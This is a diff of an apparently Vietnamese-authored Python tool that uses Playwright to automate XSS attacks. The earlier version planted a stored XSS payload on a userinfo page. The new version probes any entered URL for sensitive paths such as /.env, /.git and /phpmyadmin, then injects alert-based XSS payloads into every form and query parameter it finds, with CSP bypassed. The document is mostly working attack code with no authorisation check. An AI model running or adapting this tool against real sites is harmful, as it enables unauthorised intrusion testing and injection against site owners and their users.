@@ -3,7 +3,6 @@ import signal
 import sys
 import logging
 import requests
-import random
 from playwright.sync_api import sync_playwright, Playwright
 from playwright._impl._errors import TimeoutError
 
@@ -12,20 +11,27 @@ logging.basicConfig(filename='scan.log', level=logging.INFO, format='%(asctime)s
 
 # Danh sách payloads
 XSS_PAYLOADS = [
-    "<script>alert(1)</script>",
-    "<script>alert('XSS')</script>",
-    "<svg/onload=alert('XSS')>",
-    "<img src=x onerror=alert('XSS')>",
-    "<scrIpt>alert('XSS')</scrIpt>",
-    "javascript:alert('XSS')",
+    "<script>alert(1)</script>", "<script>alert('XSS')</script>",
+    "<svg/onload=alert('XSS')>", "<img src=x onerror=alert('XSS')>",
+    "test@example.com<script>alert(1)</script>", "test@example.com\" onmouseover=\"alert(1)",
+    "javascript:alert('XSS')@example.com"
 ]
 
-# Biến toàn cục để theo dõi trạng thái quét
+# Common paths
+COMMON_PATHS = [
+    "/login", "/login.php", "/admin", "/admin.php", "/dashboard", "/auth", "/signin",
+    "/user/login", "/adminpanel", "/controlpanel", "/secure", "/administrator",
+    "/wp-login.php", "/wp-admin", "/wp-content", "/phpmyadmin", "/pma", "/config.php",
+    "/.env", "/.git", "/api", "/api/v1", "/uploads", "/upload", "/files", "/media",
+    "/robots.txt", "/sitemap.xml", "/admin-console", "/webdav"
+]
+
+# Biến toàn cục
 stop_scanning = False
 results_found = []
-alert_triggered = False  # Biến để kiểm soát số lượng alert
+alert_triggered = False
 
-# Xử lý tín hiệu dừng (Ctrl+C)
+# Xử lý Ctrl+C
 def signal_handler(sig, frame):
     global stop_scanning
     print("\n[!] Stopping scan...")
@@ -38,358 +44,144 @@ def signal_handler(sig, frame):
 
 signal.signal(signal.SIGINT, signal_handler)
 
-# Tự động đăng nhập và khai thác XSS bằng Playwright
-def auto_login_and_exploit_xss(playwright: Playwright, login_url, userinfo_url, sqli_payload, xss_payload, max_retries=3):
+# Hàm quét path ban đầu với Playwright
+def scan_initial_paths(target):
+    valid_paths = []
+    print(f"\n[*] Scanning initial paths on {target}...")
+    
+    with sync_playwright() as playwright:
+        browser = playwright.chromium.launch(headless=True)
+        context = browser.new_context(ignore_https_errors=True)
+        page = context.new_page()
+
+        # Lấy nội dung mặc định từ trang chính trước
+        try:
+            page.goto(target, timeout=10000)
+            default_content = page.content()
+            print(f"[*] Default content loaded from {target}")
+        except TimeoutError:
+            print(f"[!] Timeout loading default content from {target}")
+            default_content = ""
+            browser.close()
+            return valid_paths
+
+        # Kiểm tra từng path
+        for path in COMMON_PATHS:
+            full_url = f"{target.rstrip('/')}{path}"
+            try:
+                page.goto(full_url, timeout=10000)
+                content = page.content()
+                if content and (content != default_content or "form" in content.lower() or page.query_selector("form")):
+                    print(f"[+] Found unique path: {path} - Status: {page.evaluate('() => document.readyState')}")
+                    valid_paths.append(full_url)
+                else:
+                    print(f"[-] Default path: {path}")
+            except TimeoutError:
+                print(f"[-] Timeout or inaccessible: {path}")
+            except Exception as e:
+                print(f"[-] Error on {path}: {e}")
+
+        browser.close()
+    return valid_paths
+
+# Hàm kiểm tra XSS trên từng path
+def exploit_xss(playwright: Playwright, url, xss_payload):
     global stop_scanning, alert_triggered
     browser = None
     try:
-        browser = playwright.chromium.launch(headless=False)  # Tắt chế độ headless để hiển thị giao diện
-        context = browser.new_context(
-            ignore_https_errors=True,
-            bypass_csp=True,
-            viewport={"width": 1280, "height": 720}
-        )
-        for attempt in range(max_retries):
-            try:
-                page = context.new_page()
+        browser = playwright.chromium.launch(headless=False)
+        context = browser.new_context(ignore_https_errors=True, bypass_csp=True)
+        page = context.new_page()
 
-                # Xử lý dialog ngay từ đầu để tránh bị treo
-                def handle_dialog(dialog):
-                    global alert_triggered
-                    if not alert_triggered:
-                        alert_triggered = True
-                        print(f"[*] Native alert triggered: {dialog.message}")
-                        print("[*] Accepting alert automatically...")
-                        dialog.accept()
-                        # Vô hiệu hóa thêm alert
-                        page.evaluate("""
-                            () => {
-                                window.alert = () => {};
-                                const scripts = document.querySelectorAll('script');
-                                scripts.forEach(script => {
-                                    if (script.innerHTML.includes('alert')) {
-                                        script.remove();
-                                    }
-                                });
-                            }
-                        """)
+        # Xử lý dialog
+        def handle_dialog(dialog):
+            global alert_triggered
+            if not alert_triggered:
+                alert_triggered = True
+                print(f"[*] Alert triggered: {dialog.message}")
+                dialog.accept()
+                page.evaluate("window.alert = () => {};")
 
-                page.on("dialog", handle_dialog)
+        page.on("dialog", handle_dialog)
 
-                # 1. Đăng nhập bằng Playwright (sử dụng payload an toàn hơn)
-                print(f"[*] Opening Chrome to login at {login_url} (Attempt {attempt + 1}/{max_retries})...")
-                page.goto(login_url)
-                page.wait_for_selector("input[name='uname']", timeout=60000)
-                page.fill("input[name='uname']", "test")  # Sử dụng username an toàn
-                page.wait_for_selector("input[name='pass']", timeout=60000)
-                page.fill("input[name='pass']", "test")  # Sử dụng password an toàn
-                page.wait_for_selector("input[type='submit']", timeout=60000)
-                page.click("input[type='submit']")
+        # Truy cập URL
+        print(f"[*] Visiting {url} to test XSS with {xss_payload}...")
+        page.goto(url, timeout=60000)
 
-                # Chờ điều hướng hoặc xử lý alert
-                try:
-                    page.wait_for_url("**/userinfo.php", timeout=30000)
-                    print(f"[*] Login successful, redirected to {page.url}")
-                except TimeoutError:
-                    if alert_triggered:
-                        print("[*] Alert triggered during login, proceeding without waiting for full redirection...")
+        # Kiểm tra form
+        forms = page.query_selector_all("form")
+        if forms:
+            print(f"[*] Found {len(forms)} forms on {url}. Injecting payload...")
+            for form in forms:
+                inputs = form.query_selector_all("input, textarea")
+                if inputs:
+                    for input_field in inputs:
+                        input_name = input_field.get_attribute("name") or "unnamed"
+                        input_type = input_field.get_attribute("type") or "text"
+                        if input_type not in ["submit", "button"]:
+                            if "email" in input_name.lower() or input_type == "email":
+                                payload = f"test@example.com{xss_payload}" if "@" not in xss_payload else xss_payload
+                            else:
+                                payload = xss_payload if "text" in input_type else "test"
+                            page.fill(f"[name='{input_name}']", payload)
+
+                    # Submit form
+                    submit_button = form.query_selector("input[type='submit'], button[type='submit'], button")
+                    if submit_button:
+                        submit_button.click()
                     else:
-                        raise
+                        page.evaluate("document.forms[0].submit()")
+                    time.sleep(2)
 
-                # Lưu cookies
-                cookies = context.cookies()
-                session = requests.Session()
-                for cookie in cookies:
-                    session.cookies.set(cookie['name'], cookie['value'], domain=cookie['domain'])
+                    if xss_payload in page.content():
+                        result = f"[!!!] Stored XSS found with {xss_payload} at {url}"
+                        print(result)
+                        results_found.append(result)
+                        logging.info(result)
+                        return True
 
-                # Thêm thời gian chờ
-                print("[*] Waiting for 2 seconds to reduce server load...")
-                time.sleep(2)
+        # Kiểm tra Reflected XSS qua params
+        page.goto(f"{url}?q={xss_payload}&search={xss_payload}&email={xss_payload}")
+        time.sleep(2)
+        if xss_payload in page.content():
+            result = f"[!!!] Reflected XSS found with {xss_payload} at {url}"
+            print(result)
+            results_found.append(result)
+            logging.info(result)
+            return True
 
-                # 2. Khai thác XSS trên userinfo.php
-                print(f"[*] Navigating to {userinfo_url} to exploit XSS...")
-                page.goto(userinfo_url)
+        return alert_triggered
 
-                # Kiểm tra session
-                if "uaddress" not in page.content():
-                    print("[!] Session may be invalid, page does not contain expected form. Retrying login...")
-                    page.goto(login_url)
-                    page.wait_for_selector("input[name='uname']", timeout=60000)
-                    page.fill("input[name='uname']", "test")
-                    page.wait_for_selector("input[name='pass']", timeout=60000)
-                    page.fill("input[name='pass']", "test")
-                    page.wait_for_selector("input[type='submit']", timeout=60000)
-                    page.click("input[type='submit']")
-                    page.wait_for_url("**/userinfo.php", timeout=30000)
-                    page.goto(userinfo_url)
-
-                # Tạo dữ liệu ngẫu nhiên
-                unique_email = f"test_{random.randint(1000, 9999)}@example.com"
-                unique_address = f"Street_{random.randint(1000, 9999)}"
-                unique_phone = f"123{random.randint(10000000, 99999999)}"
-
-                # Điền payload XSS và dữ liệu ngẫu nhiên vào form
-                print("[*] Filling form data...")
-                page.wait_for_selector("input[name='urname']", timeout=60000)
-                page.fill("input[name='urname']", xss_payload)
-                page.wait_for_selector("input[name='ucc']", timeout=60000)
-                page.fill("input[name='ucc']", "1234567890123456")
-
-                email_selectors = ["input[name='uemail']", "textarea[name='uemail']"]
-                email_field_found = False
-                for selector in email_selectors:
-                    try:
-                        page.wait_for_selector(selector, timeout=10000)
-                        page.fill(selector, unique_email)
-                        email_field_found = True
-                        break
-                    except TimeoutError:
-                        continue
-                if not email_field_found:
-                    raise Exception("Could not find the 'E-Mail' field to fill")
-
-                page.wait_for_selector("input[name='uphone']", timeout=60000)
-                page.fill("input[name='uphone']", unique_phone)
-
-                address_selectors = [
-                    "textarea[name='uaddress']", "input[name='uaddress']", "textarea[id='uaddress']",
-                    "input[id='uaddress']", "textarea[name='address']", "input[name='address']", "textarea"
-                ]
-                address_field_found = False
-                for selector in address_selectors:
-                    try:
-                        page.wait_for_selector(selector, timeout=20000)
-                        page.evaluate(f"""
-                            (selector) => {{
-                                const element = document.querySelector(selector);
-                                if (element) {{
-                                    element.onchange = null;
-                                    element.oninput = null;
-                                    element.onblur = null;
-                                    element.onkeyup = null;
-                                    element.onkeydown = null;
-                                    element.onfocus = null;
-                                }}
-                            }}
-                        """, selector)
-                        page.fill(selector, unique_address)
-                        address_field_found = True
-                        break
-                    except TimeoutError:
-                        continue
-                if not address_field_found:
-                    raise Exception("Could not find the 'Address' field to fill")
-
-                # Tìm và bấm nút "update"
-                print("[*] Submitting form...")
-                update_button_selectors = [
-                    "input[name='update']", "button[name='update']", "input[type='submit']",
-                    "button[type='submit']", "input[value='update']", "button[value='update']",
-                    "form input[type='submit']", "form button[type='submit']", "input[name='submit']",
-                    "button[name='submit']", "button"
-                ]
-                update_button_found = False
-                for selector in update_button_selectors:
-                    try:
-                        page.wait_for_selector(selector, timeout=20000, state="visible")
-                        is_disabled = page.evaluate(f"(selector) => document.querySelector(selector).disabled", selector)
-                        if is_disabled:
-                            print(f"[!] Button {selector} is disabled. Attempting to enable it...")
-                            page.evaluate(f"(selector) => document.querySelector(selector).disabled = false", selector)
-                            is_disabled = page.evaluate(f"(selector) => document.querySelector(selector).disabled", selector)
-                            if is_disabled:
-                                print(f"[!] Button {selector} is still disabled. Skipping...")
-                                continue
-                        button_text = page.evaluate(f"(selector) => document.querySelector(selector).value || document.querySelector(selector).textContent", selector)
-                        button_text = button_text.lower() if button_text else ""
-                        if "update" not in button_text:
-                            continue
-                        page.evaluate(f"""
-                            (selector) => {{
-                                const element = document.querySelector(selector);
-                                if (element) {{
-                                    element.onclick = null;
-                                    element.onmousedown = null;
-                                    element.onmouseup = null;
-                                }}
-                            }}
-                        """, selector)
-                        page.click(selector)
-                        update_button_found = True
-                        print(f"[*] Successfully clicked 'update' button with selector: {selector}")
-                        break
-                    except TimeoutError:
-                        print(f"[!] Timeout waiting for selector {selector}. Trying next selector...")
-                        continue
-                    except Exception as e:
-                        print(f"[!] Error with selector {selector}: {e}. Trying next selector...")
-                        continue
-                if not update_button_found:
-                    raise Exception("Could not find the 'update' button to submit the form")
-
-                # Kiểm tra payload đã lưu
-                print("[*] Verifying if payload was stored...")
-                time.sleep(2)
-                response = requests.get(userinfo_url, cookies={cookie['name']: cookie['value'] for cookie in context.cookies()}, timeout=10)
-                if xss_payload in response.text:
-                    print(f"[*] Payload {xss_payload} found in response HTML, likely stored.")
-                else:
-                    print(f"[!] Payload {xss_payload} not found in response HTML. XSS may not have been exploited.")
-                    raise Exception("Payload not stored in HTML after form submission")
-
-                # Kích hoạt alert một lần
-                print("[*] Triggering alert dialog (once)...")
-                alert_triggered = False
-                native_alert_message = [None]
-
-                def handle_dialog(dialog):
-                    global alert_triggered
-                    if not alert_triggered:
-                        alert_triggered = True
-                        native_alert_message[0] = dialog.message
-                        print(f"[*] Native alert triggered: {dialog.message}")
-                        print("[*] Accepting alert automatically...")
-                        dialog.accept()
-                        page.evaluate("""
-                            () => {
-                                window.alert = () => {};
-                                const scripts = document.querySelectorAll('script');
-                                scripts.forEach(script => {
-                                    if (script.innerHTML.includes('alert')) {
-                                        script.remove();
-                                    }
-                                });
-                            }
-                        """)
-
-                page.on("dialog", handle_dialog)
-
-                # Thực thi payload một lần
-                page.evaluate(f"""
-                    () => {{
-                        if (!window.alertTriggered) {{
-                            window.alertTriggered = true;
-                            {xss_payload.replace('<script>', '').replace('</script>', '')}
-                        }}
-                    }}
-                """)
-                page.wait_for_timeout(15000)
-
-                if not alert_triggered:
-                    print("[!] Native alert did not appear. Proceeding with custom alert...")
-
-                # Tạo custom alert
-                print("[*] Triggering custom alert...")
-                alert_message = page.evaluate(f"""
-                    () => {{
-                        if (!window.customAlertTriggered) {{
-                            window.customAlertTriggered = true;
-                            const alertMessage = "{xss_payload.replace('<script>alert(1)</script>', '1')}";
-                            window.lastAlert = alertMessage;
-                            const alertDiv = document.createElement('div');
-                            alertDiv.style.position = 'fixed';
-                            alertDiv.style.top = '50%';
-                            alertDiv.style.left = '50%';
-                            alertDiv.style.transform = 'translate(-50%, -50%)';
-                            alertDiv.style.backgroundColor = 'white';
-                            alertDiv.style.border = '2px solid black';
-                            alertDiv.style.padding = '20px';
-                            alertDiv.style.zIndex = '1000';
-                            alertDiv.innerText = 'Custom Alert: ' + alertMessage;
-                            document.body.appendChild(alertDiv);
-                            setTimeout(() => {{
-                                document.body.removeChild(alertDiv);
-                            }}, 10000);
-                            return alertMessage;
-                        }}
-                        return null;
-                    }}
-                """)
-                time.sleep(10)
-
-                # Hiển thị kết quả
-                print(f"[!!!] Stored XSS Exploited with payload: {xss_payload} at {userinfo_url}")
-                if alert_triggered and native_alert_message[0]:
-                    print(f"[*] Native alert triggered: {native_alert_message[0]}")
-                if alert_message:
-                    print(f"[*] Custom alert triggered: {alert_message}")
-                result = f"[!!!] Stored XSS Exploited with payload: {xss_payload} at {userinfo_url}"
-                if alert_triggered and native_alert_message[0]:
-                    result += f"\n[*] Native alert triggered: {native_alert_message[0]}"
-                if alert_message:
-                    result += f"\n[*] Custom alert triggered: {alert_message}"
-
-                print(result)
-                results_found.append(result)
-                with open("xss_results.txt", "a") as f:
-                    f.write(f"Exploited: {userinfo_url}\n")
-                logging.info(f"Stored XSS Exploited with payload: {xss_payload}")
-                stop_scanning = True
-                return True
-
-            except TimeoutError as e:
-                print(f"[!] Timeout waiting for alert dialog or page redirection (Attempt {attempt + 1}/{max_retries}): {e}")
-                if attempt < max_retries - 1:
-                    print("[*] Retrying...")
-                    if page:
-                        page.close()
-                    continue
-                print(f"[!!!] Stored XSS may have been exploited with payload: {xss_payload} at {userinfo_url} (check manually)")
-                result = f"[!!!] Stored XSS may have been exploited with payload: {xss_payload} at {userinfo_url}\n[*] Alert dialog should have been triggered (check manually)."
-                print(result)
-                results_found.append(result)
-                with open("xss_results.txt", "a") as f:
-                    f.write(f"Exploited: {userinfo_url}\n")
-                logging.info(f"Stored XSS may have been exploited with payload: {xss_payload}")
-                stop_scanning = True
-                return True
-            except Exception as e:
-                print(f"[!] Error during login/exploitation (Attempt {attempt + 1}/{max_retries}): {e}")
-                if attempt < max_retries - 1:
-                    print("[*] Retrying...")
-                    if page:
-                        page.close()
-                    continue
-                print(f"[!!!] Stored XSS may have been exploited with payload: {xss_payload} at {userinfo_url} (check manually)")
-                result = f"[!!!] Stored XSS may have been exploited with payload: {xss_payload} at {userinfo_url}\n[*] Alert dialog should have been triggered (check manually)."
-                print(result)
-                results_found.append(result)
-                with open("xss_results.txt", "a") as f:
-                    f.write(f"Exploited: {userinfo_url}\n")
-                logging.info(f"Stored XSS may have been exploited with payload: {xss_payload}")
-                stop_scanning = True
-                return True
-
+    except Exception as e:
+        print(f"[!] Error on {url}: {e}")
         return False
-
     finally:
         if browser:
-            print("[*] Closing Chrome browser...")
             browser.close()
 
-# Hàm khai thác tự động
-def auto_exploit(url, vuln_name, payloads, max_time=600):
+# Hàm quét tự động
+def auto_exploit(target, paths, payloads, max_time=600):
     global stop_scanning
     start_time = time.time()
-    print(f"\n[*] Scanning {vuln_name} on {url} (Max time: {max_time} seconds)")
-
-    userinfo_url = f"{url.rstrip('/')}/userinfo.php"
-    login_url = f"{url.rstrip('/')}/login.php"
+    print(f"\n[*] Starting XSS scan on {target} (Max time: {max_time}s)...")
 
     with sync_playwright() as playwright:
-        for payload in payloads:
-            if stop_scanning:
+        for path in paths:
+            if stop_scanning or time.time() - start_time > max_time:
                 break
-            print(f"[*] Testing XSS payload: {payload}")
-            if auto_login_and_exploit_xss(playwright, login_url, userinfo_url, "test", payload):  # Thay đổi sqli_payload
-                break
+            print(f"\n[*] Testing path: {path}")
+            for payload in payloads:
+                if stop_scanning or time.time() - start_time > max_time:
+                    break
+                if exploit_xss(playwright, path, payload):
+                    break
 
     if results_found:
         with open("scan_results.txt", "a") as f:
             for result in results_found:
                 f.write(result + "\n")
 
-# Hàm quét XSS và hiển thị menu
+# Menu chính
 def scan_xss_and_continue():
     global stop_scanning, alert_triggered
     while True:
@@ -397,22 +189,20 @@ def scan_xss_and_continue():
         alert_triggered = False
         results_found.clear()
 
-        target_url = input("Enter target URL to scan for XSS (e.g., http://example.com/): ")
-        auto_exploit(target_url, "XSS", XSS_PAYLOADS)
+        target_url = input("Enter target URL to scan for XSS (e.g., https://example.com/): ")
+        valid_paths = scan_initial_paths(target_url)
+        
+        if valid_paths:
+            print(f"\n[*] Found {len(valid_paths)} valid paths. Starting XSS scan...")
+            auto_exploit(target_url, valid_paths, XSS_PAYLOADS)
+        else:
+            print("[!] No unique or restricted paths found. XSS scan skipped.")
 
         print("\nScan completed!")
-        print("Would you like to continue scanning another URL or exit?")
-        print("1. Scan another URL")
-        print("2. Exit")
-        choice = input("Enter your choice (1 or 2): ")
-
-        if choice == "1":
-            continue
-        elif choice == "2":
-            print("[*] Exiting program...")
-            sys.exit(0)
-        else:
-            print("[!] Invalid choice. Exiting program...")
+        print("1. Scan another URL\n2. Exit")
+        choice = input("Choice (1 or 2): ")
+        if choice != "1":
+            print("[*] Exiting...")
             sys.exit(0)
 
 if __name__ == "__main__":
